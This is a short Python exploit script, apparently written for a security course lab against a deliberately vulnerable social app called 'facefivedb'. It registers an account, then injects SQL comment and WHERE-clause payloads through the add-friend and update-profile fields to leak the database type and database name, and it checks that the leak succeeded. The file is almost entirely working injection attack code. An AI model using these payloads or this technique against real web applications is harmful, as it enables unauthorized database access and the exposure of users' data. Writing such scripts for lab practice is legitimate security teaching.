#!/usr/bin/env python3
import requests, sys
from interface import *
from bs4 import BeautifulSoup

if len(sys.argv) != 2:
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username = 'asdf'
password = 'asdf'
dms = "MySQL"
db_name = "facefivedb"

session = requests.Session()

reset_app(session, url)
register(session, url, username=username, password=password)

# Add friend 
payload = """ssofadmin' #"""
r = add_friend(session, url, username=payload)

soup = BeautifulSoup(r.text, 'html.parser')

assert dms in soup.find("h4").text
print(f"[+] Successfully got the information that the dms is {dms}")

# Update profile
payload = """' WHERE username='ssofadmin' #"""
r = update_profile(session, url, name=payload, password=password)

soup = BeautifulSoup(r.text, 'html.parser')

assert db_name in soup.find("h4").text
print(f"[+] Successfully got the information that the db name is {db_name}")

session.close()
